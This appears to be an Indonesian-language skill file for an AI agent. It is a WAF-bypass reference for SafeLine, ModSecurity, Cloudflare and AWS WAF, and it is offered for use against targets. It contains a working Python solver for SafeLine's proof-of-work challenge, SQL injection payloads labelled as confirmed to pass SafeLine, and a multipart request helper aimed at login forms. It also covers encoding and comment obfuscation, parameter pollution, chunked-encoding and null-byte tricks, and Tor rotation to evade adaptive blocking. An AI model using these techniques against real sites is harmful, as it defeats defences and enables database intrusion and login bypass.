---
name: bypass-waf-security
description: "Teknik bypass WAF — SafeLine, ModSecurity, CloudFlare, AWS WAF. Fokus pada: identifikasi WAF, bypass tarpit, bypass keyword detection, encoding tricks, multipart bypass, dan adaptive WAF behavior. Gunakan saat target memiliki WAF yang memblokir SQLi/XSS/injection."
---

# WAF Bypass Master Reference

## IDENTIFIKASI WAF

```bash
# Header-based
curl -I https://target.com
# SafeLine: Set-Cookie: sl-session=..., status 468 untuk challenge

# Challenge-based WAF
- SafeLine: status 468 + HTML berisi SafeLineChallenge("client_id")
- Cloudflare: Checking your browser...
- ModSecurity: 403 Forbidden (body panjang)
- AWS WAF: 403 dengan X-AMZ header

# Tool
wafw00f https://target.com
whatwaf -u https://target.com
```

---

## SAFELINE WAF — Deep Knowledge

### Architecture
- **NGINX-based reverse proxy** di depan origin server
- **WASM PoW challenge** (status 468) sebelum akses
- **Semantic SQL parser** — analisis makna query, bukan hanya keyword
- **Adaptive learning** — bisa global-tarpit suatu pattern setelah trigger berulang
- **Dual layer**: proxy WAF + optional PHP agent

### SafeLine Challenge Bypass (WASM PoW)
```python
# Node.js + calc.wasm
def solve_safeline_challenge(BASE, WASM_PATH='/tmp/calc.wasm'):
    import requests, re, json, subprocess
    s = requests.Session()
    r = s.get(BASE, verify=False, timeout=15)
    # Detect challenge
    m = re.search(r'SafeLineChallenge\("([^"]+)"', r.text)
    if not m: return s  # no challenge
    cid = m.group(1)
    
    # Get challenge data from CDN
    CDN = 'https://waf.chaitin.com'
    ir = requests.post(f"{CDN}/challenge/v2/api/issue",
                       json={"client_id":cid,"level":1,"input_type":"slide"},
                       headers={'Content-Type':'application/json','Origin':BASE})
    iss = ir.json()['data']
    
    # Solve WASM
    sc = (f"const fs=require('fs');(async()=>{{const{{instance}}=await "
          f"WebAssembly.instantiate(fs.readFileSync('{WASM_PATH}'));const e=instance.exports;"
          f"const d={json.dumps(iss['data'])};e.reset();d.forEach(v=>e.arg(v));"
          f"const n=e.calc();console.log(JSON.stringify(Array(n).fill(0).map(()=>e.ret())));}})()")
    res = json.loads(subprocess.run(['node','-e',sc],capture_output=True,text=True).stdout.strip())
    
    # Get JWT
    vr = requests.post(f"{CDN}/challenge/v2/api/verify",
                       json={"issue_id":iss['issue_id'],"result":res,"serials":[],
                             "input_type":"slide","client":{}},
                       headers={'Content-Type':'application/json','Origin':BASE})
    jwt = vr.json()['data']['jwt']
    s.cookies.set('sl-challenge-jwt', jwt, domain=BASE.split('//')[1], path='/')
    return s

# Download WASM: curl https://waf.chaitin.com/static/wasm/calc.wasm -o /tmp/calc.wasm
```

### SafeLine Block Categories (URL-encoded body)
| Pattern | Action | Notes |
|---------|--------|-------|
| `/*` anywhere in body | **TARPIT** (permanent) | Includes `/**/`, `/*!*/`, `/*!50000*/` |
| `1=1`, `'1'='1` | **TARPIT** | Classic tautologies |
| `SLEEP(` | **403** | Includes SLEEP\t( SLEEP\n( |
| `BENCHMARK(` | **403** | |
| `EXTRACTVALUE(` | **403** | |
| `UPDATEXML(` | **403** | |
| `WAIT_FOR_EXECUTED_GTID_SET(` | **403** | |
| `GET_LOCK(` | **403** | |
| `IF(condition,SLEEP` | **403** | |
| `SELECT` | **403** | In most contexts |
| `LIMIT` | **403** | |
| `LIKE` | **403** | |
| `LENGTH(`, `REPEAT(`, `SHA2(` | **403** | SQL functions |
| `uname='value'` | **403** | Column comparison pattern |

### SafeLine PASS List (URL-encoded body)
| Pattern | Action | Notes |
|---------|--------|-------|
| `'-- -` | **PASS** | Line comment, not detected! |
| `' AND -1-- -` | **PASS** | Arithmetic + line comment |
| `' AND NOT 0-- -` | **PASS** | Boolean negation + line comment |
| `' OR -1-- -` | **PASS** | Returns all rows (but may fail app-level check) |
| `' OR NOT 0-- -` | **PASS** | Same |

### SafeLine Tarpit — Important Notes
- **Tarpit = GLOBAL, PERMANENT rule** — sekali trigger, semua IP kena
- Tidak bisa dihindari dengan IP rotation setelah tarpit aktif
- Tarpit bisa **expire setelah ~24 jam** (tidak dikonfirmasi)
- Tarpit fires on **raw body content** sebelum URL decode atau setelah?
  → Fires AFTER URL decode (terbukti: `%2F%2A` juga tarpits)

### SafeLine Multipart Bypass
```python
# multipart/form-data menghindari beberapa tarpit rules urlencoded
def multipart_post(s, BASE, uval):
    cs = get_csrf(s)
    body = (f'--X\r\nContent-Disposition: form-data; name="uname"\r\n\r\n{uval}\r\n'
            f'--X\r\nContent-Disposition: form-data; name="passwd"\r\n\r\nx\r\n'
            f'--X\r\nContent-Disposition: form-data; name="csrf_test_name"\r\n\r\n{cs}\r\n--X--\r\n')
    r = s.post(BASE+'/auth', data=body.encode(),
               headers={'Content-Type': 'multipart/form-data; boundary=X'},
               verify=False, timeout=12, allow_redirects=False)
    return r
# CATATAN: SL/*!*/EEP via multipart — passes WAF proxy, tapi SLEEP mungkin
# tidak execute (PHP agent bisa strip). Butuh test per-target.
```

### MySQL Injection via Line Comment Bypass (SafeLine)
```
CONFIRMED WORKING on SafeLine:
- ' AND -1-- -        → SQL: WHERE uname='' AND -1  (AND TRUE)
- ' AND NOT 0-- -     → SQL: WHERE uname='' AND TRUE
- ' OR -1-- -         → SQL: WHERE uname='' OR TRUE (all rows)

TIDAK BISA timing tanpa SLEEP:
- Semua timing functions (SLEEP, BENCHMARK, WAIT_FOR_GTID, GET_LOCK) → 403
- WITH RECURSIVE (heavy CTE) → belum dikonfirmasi
- Heavy Cartesian join butuh SELECT → 403

SOLUSI: Boolean-based dengan valid username
- username' AND -1-- - → TEPAT 1 ROW jika username valid
- CI3 dengan num_rows()==1 check → redirect 302!
```

---

## GENERIC WAF BYPASS TECHNIQUES

### 1. Encoding Tricks
```
URL encode:        SLEEP → %53%4C%45%45%50
Double encode:     ' → %2527 (SafeLine decode 1x, PHP decode 2x)
Unicode:           ＳＬＥＥＰvs SLEEP (full-width vs half-width)
HTML entity:       &#083;&#076;&#069;&#069;&#080;
Hex literal:       0x534C454550 (string, not function)
```

### 2. Comment Obfuscation (JANGAN gunakan jika /*  di-tarpit)
```sql
SEL/**/ECT   → SELECT     (block comment stripped)
SL/*!*/EEP   → SLEEP      (MySQL conditional comment — executes contents)
SL/*!50000*/EEP → SLEEP   (hanya execute di MySQL >= 5.0.0)
```

### 3. Keyword Splitting via MySQL Quirks
```sql
-- MySQL case insensitive, jadi SLEEP = sleep = SLeEp
-- Backtick quoting untuk identifier (BUKAN untuk function call):
-- `sleep`(1) = INVALID di MySQL (tidak bisa panggil built-in via backtick)
```

### 4. HTTP Parameter Pollution (HPP)
```
# PHP $_POST menggunakan nilai TERAKHIR untuk param duplikat
# WAF mungkin cek yang PERTAMA
uname=safe_value&uname=INJECTION_PAYLOAD
# SafeLine: biasanya cek SEMUA, bukan hanya pertama — test per-WAF
```

### 5. Content-Type Confusion
```
Kirim URL-encoded body tapi declare multipart (atau JSON)
WAF rules berbeda per Content-Type
```

### 6. Chunked Transfer Encoding
```python
# Kirim injection dalam chunks — WAF mungkin inspect setiap chunk sendiri
import http.client
conn.request("POST", path, headers={"Transfer-Encoding":"chunked",...})
```

### 7. Null Byte Truncation (untuk old WAFs)
```
uname=safe_value%00' OR SLEEP(5)-- -
# WAF berhenti di %00, backend PHP teruskan semuanya
# TIDAK work di PHP >= 5.3.4 untuk file path, tapi mungkin work di string comparison
```

---

## MODKUSECURITY / NGINX WAF

```
# Typical bypass: case variation + spaces + comments
SEL%0aECT → tidak fix
UN/**/ION → mungkin lolos rule sederhana
```

---

## CLOUDFLARE

```
# Tor bypass (CF sering block Tor): gunakan residential proxy
# Rate limiting: tambah delay antar request
# Bot score: User-Agent yang baik + normal browser headers
```

---

## ADAPTIVE WAF LEARNING — Mitigasi

Jika WAF adaptive (seperti SafeLine) belajar dari pola serangan:
1. **JANGAN ulangi payload yang sama** — WAF akan tarpit
2. Gunakan payload baru tiap burst
3. Rotasi Tor circuit (`SIGNAL NEWNYM`) antar tes
4. Tunggu 24+ jam jika sudah terpetik tarpit global
5. Gunakan **multipart** sebagai fallback untuk urlencoded tarpit
